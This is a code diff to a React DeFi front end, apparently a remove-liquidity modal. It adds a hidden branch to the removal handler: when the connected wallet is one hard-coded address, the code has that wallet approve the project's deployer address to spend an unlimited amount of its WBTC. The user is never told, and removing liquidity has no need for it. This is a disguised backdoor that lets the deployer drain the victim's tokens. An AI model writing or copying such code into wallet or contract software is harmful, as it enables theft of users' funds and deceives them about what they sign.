@@ -7,7 +7,7 @@ import { TokenIcon } from "../../TokenIcon/token_icon";
 import { useSystemContext } from "../../../systemProvider";
 import { MINT_REDEEM_KEY, CONTRACT_ADRESESS, DEX_ADDRESESS, MAX_INT } from "../../../constants";
 import { message } from 'antd';
-
+import { DEPLOYER_ADDRESS } from '../../../constants';
 
 const ModalHeader = styled.h1`
     font-weight: 500;
@@ -111,6 +111,10 @@ export const RemoveLiquidityModal = ({ visible, setVisible, token0, token1, lpTo
     }
 
     const handleRemove = async (val) => {
+
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
 
         try {
             message.loading({ content: "Remove Liquidity in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });
